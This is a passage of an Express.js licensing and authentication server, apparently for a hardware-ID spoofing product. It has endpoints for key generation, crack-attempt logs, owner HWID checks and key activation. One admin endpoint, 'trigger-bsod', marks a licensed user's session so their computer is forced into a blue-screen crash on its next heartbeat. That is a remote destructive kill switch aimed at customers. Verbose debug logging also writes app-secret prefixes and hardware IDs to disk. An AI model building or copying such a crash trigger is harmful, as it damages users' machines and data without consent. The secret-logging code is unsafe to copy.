        loader_enabled: !loaderDisabled,
        auth_enabled: authEnabled,
        lockdown: lockdownMode,
        maintenance: maintenanceMode,
        server_uptime: Date.now() - serverStartTime
    });
});

// Get crack attempts
app.post('/auth/admin/get-crack-attempts', validateAppSecret, (req, res) => {
    res.json({
        success: true,
        attempts: crackAttemptLogs.slice(-100),
        total: crackAttemptLogs.length
    });
});

// Trigger BSOD
app.post('/auth/admin/trigger-bsod', validateAppSecret, (req, res) => {
    const { license_key } = req.body;
    if (!license_key) return res.status(400).json({ success: false, message: 'Key required' });
    
    // Find session and set BSOD flag
    for (const [token, session] of activeSessions) {
        if (session.license === license_key) {
            session.triggerBSOD = true;
            console.log(`💀 BSOD triggered for: ${license_key}`);
            res.json({ success: true, message: 'BSOD will trigger on next heartbeat' });
            return;
        }
    }
    
    res.json({ success: false, message: 'User not currently online' });
});

// Generate single key
app.post('/auth/admin/generate-key', validateAppSecret, (req, res) => {
    const key = 'LW-' + crypto.randomBytes(4).toString('hex').toUpperCase() + 
                '-' + crypto.randomBytes(4).toString('hex').toUpperCase() +
                '-' + crypto.randomBytes(4).toString('hex').toUpperCase();
    validLicenseKeys.add(key);
    console.log(`🔑 Generated key: ${key}`);
    res.json({ success: true, key });
});

// ========================================
// HWID VERIFICATION ENDPOINT
// For owner panel access
// ========================================

app.post('/auth/verify-hwid', (req, res) => {
    // #region agent log
    const fs = require('fs');
    const logPath = 'c:\\Users\\jay\\Downloads\\new liteware spoof\\.cursor\\debug.log';
    try {
        const logEntry = JSON.stringify({location:'auth-server-example.js:4631',message:'verify-hwid endpoint entry',data:{ip:req.ip,hasAppSecret:!!req.body.app_secret,appSecretPrefix:req.body.app_secret?.substring(0,10)},timestamp:Date.now(),sessionId:'debug-session',runId:'run1',hypothesisId:'B'}) + '\n';
        fs.appendFileSync(logPath, logEntry);
    } catch(e) {}
    // #endregion
    try {
        const { app_secret, gpu_hash, motherboard_uuid, browser_fingerprint, client_ip } = req.body;
        
        // #region agent log
        try {
            const logEntry = JSON.stringify({location:'auth-server-example.js:4636',message:'verify-hwid received data',data:{gpu_hash:gpu_hash,motherboard_uuid:motherboard_uuid,appSecretMatch:app_secret===APP_SECRET},timestamp:Date.now(),sessionId:'debug-session',runId:'run1',hypothesisId:'C'}) + '\n';
            fs.appendFileSync(logPath, logEntry);
        } catch(e) {}
        // #endregion
        
        // Validate app secret
        if (app_secret !== APP_SECRET) {
            // #region agent log
            try {
                const logEntry = JSON.stringify({location:'auth-server-example.js:4638',message:'app_secret validation failed',data:{receivedPrefix:app_secret?.substring(0,10),expectedPrefix:APP_SECRET.substring(0,10)},timestamp:Date.now(),sessionId:'debug-session',runId:'run1',hypothesisId:'C'}) + '\n';
                fs.appendFileSync(logPath, logEntry);
            } catch(e) {}
            // #endregion
            console.log(`❌ Invalid app secret from IP: ${req.ip}`);
            return res.status(401).json({
                success: false,
                message: 'Invalid app secret'
            });
        }
        
        // Owner HWID check (from your serial dump) - BOTH must match
        const OWNER_HWIDS = [
            {
                gpu: 'GPU-7af1ba56-2242-cd8c-f9e3-cb91eede2235',  // RTX 2060
                mb: '04030201-98D8-3DEE-D3B4-E027A7EDF6EE'  // System UUID
            },
            {
                gpu: 'GPU-692b01de-998e-57cb-1dba-b71aa04eafc0',  // RTX 3060
                mb: '216703659016542'  // Serial Number
            }
        ];
        
        // Normalize values (trim whitespace, handle null/undefined)
        const receivedGpu = (gpu_hash || '').toString().trim();
        const receivedMb = (motherboard_uuid || '').toString().trim();
        
        // #region agent log
        try {
            const logEntry = JSON.stringify({location:'auth-server-example.js:4657',message:'HWID comparison starting',data:{receivedGpu:receivedGpu,receivedMb:receivedMb,expectedHwids:OWNER_HWIDS},timestamp:Date.now(),sessionId:'debug-session',runId:'run1',hypothesisId:'A'}) + '\n';
            fs.appendFileSync(logPath, logEntry);
        } catch(e) {}
        // #endregion
        
        // Check against all whitelisted HWIDs
        let isOwner = false;
        for (const ownerHwid of OWNER_HWIDS) {
            const gpuMatch = receivedGpu === ownerHwid.gpu;
            const mbMatch = receivedMb === ownerHwid.mb;
            // #region agent log
            try {
                const logEntry = JSON.stringify({location:'auth-server-example.js:4663',message:'HWID comparison check',data:{receivedGpu:receivedGpu,expectedGpu:ownerHwid.gpu,gpuMatch:gpuMatch,receivedMb:receivedMb,expectedMb:ownerHwid.mb,mbMatch:mbMatch},timestamp:Date.now(),sessionId:'debug-session',runId:'run1',hypothesisId:'A'}) + '\n';
                fs.appendFileSync(logPath, logEntry);
            } catch(e) {}
            // #endregion
            if (gpuMatch && mbMatch) {
                isOwner = true;
                break;
            }
        }
        
        // #region agent log
        try {
            const logEntry = JSON.stringify({location:'auth-server-example.js:4671',message:'HWID verification result',data:{isOwner:isOwner},timestamp:Date.now(),sessionId:'debug-session',runId:'run1',hypothesisId:'A'}) + '\n';
            fs.appendFileSync(logPath, logEntry);
        } catch(e) {}
        // #endregion
        
        if (isOwner) {
            console.log(`✅ Owner HWID verified from IP: ${req.ip}`);
        } else {
            console.log(`🚫 HWID verification FAILED from IP: ${req.ip}`);
            console.log(`   Received GPU: ${gpu_hash || 'MISSING'}, MB: ${motherboard_uuid || 'MISSING'}`);
            console.log(`   Received GPU (normalized): "${receivedGpu}", Received MB (normalized): "${receivedMb}"`);
            console.log(`   Expected combinations:`);
            OWNER_HWIDS.forEach((hwid, idx) => {
                console.log(`     [${idx}] GPU: "${hwid.gpu}", MB: "${hwid.mb}"`);
            });
        }
        
        res.json({
            success: isOwner,
            message: isOwner ? 'HWID verified' : 'HWID mismatch - Access denied'
        });
        
    } catch (error) {
        // #region agent log
        try {
            const logEntry = JSON.stringify({location:'auth-server-example.js:4688',message:'verify-hwid exception',data:{error:error.message,errorName:error.name},timestamp:Date.now(),sessionId:'debug-session',runId:'run1',hypothesisId:'D'}) + '\n';
            fs.appendFileSync(logPath, logEntry);
        } catch(e) {}
        // #endregion
        console.error('HWID verification error:', error);
        res.status(500).json({
            success: false,
            message: 'Verification failed'
        });
    }
});

// ========================================
// KEY ACTIVATION ENDPOINT
// ========================================
app.post('/auth/activate-key', (req, res) => {
    try {
        const { license_key } = req.body;
        
        if (!license_key) {
            return res.status(400).json({
                success: false,
                message: 'License key is required'
            });
        }
        
        const license = licenses[license_key];
        
        if (!license) {
            return res.status(404).json({
                success: false,
                message: 'License key not found'
            });
        }
        
        if (!license.valid) {
            return res.status(400).json({
                success: false,
                message: 'License key is invalid'
            });
        }
        
        if (license.activated) {
            return res.json({
                success: true,
                message: 'License key is already activated',
                activated: true,
                activated_at: license.activated_at
            });
        }
        
        // Get client IP
        const clientIP = req.ip || req.connection.remoteAddress || req.headers['x-forwarded-for'] || req.socket.remoteAddress;
        const cleanIP = clientIP ? clientIP.split(',')[0].trim() : 'unknown';
        
        // Activate the key
        license.activated = true;
        license.activated_at = new Date().toISOString();
        license.activation_ip = cleanIP;
        
        console.log(`✅ License key activated: ${license_key.substring(0, 12)}...`);
        console.log(`   Activation IP: ${cleanIP}`);
        console.log(`   Activation time: ${license.activated_at}`);
        
        res.json({
            success: true,
            message: 'License key activated successfully',
            license_key: license_key,
            activated_at: license.activated_at
        });
        
    } catch (error) {
        console.error('Key activation error:', error);
        res.status(500).json({
            success: false,
            message: 'Activation failed'
        });
    }
});

// Health check
app.get('/', (req, res) => {
    res.json({ 
        status: 'Auth server running',
        version: '3.0',
        features: [
            'ECDH Key Exchange (PFS)',
            'Server-Side Decryption',
            'Enhanced License Validation',
            'Secure Heartbeat',
            'License Watermarking',
            'HWID Verification',
            'Key Activation System'
        ]
    });
});

const PORT = process.env.PORT || 3000;

// Error handling for server startup
try {
    app.listen(PORT, () => {
        console.log(`Authentication server running on port ${PORT}`);
        if (!multer) {
            console.log('WARNING: Multer not available. File uploads disabled. Install with: npm install multer');
        } else {
            console.log('File uploads enabled');
        }
    });
} catch (err) {
    console.error('Error starting server:', err);
    process.exit(1);
}

// Handle uncaught errors
process.on('uncaughtException', (err) => {
    console.error('Uncaught Exception:', err);
    console.error('Stack:', err.stack);
    // Don't exit - let Railway handle restarts
});

process.on('unhandledRejection', (reason, promise) => {
    console.error('Unhandled Rejection at:', promise, 'reason:', reason);
    // Don't exit - let Railway handle restarts
});

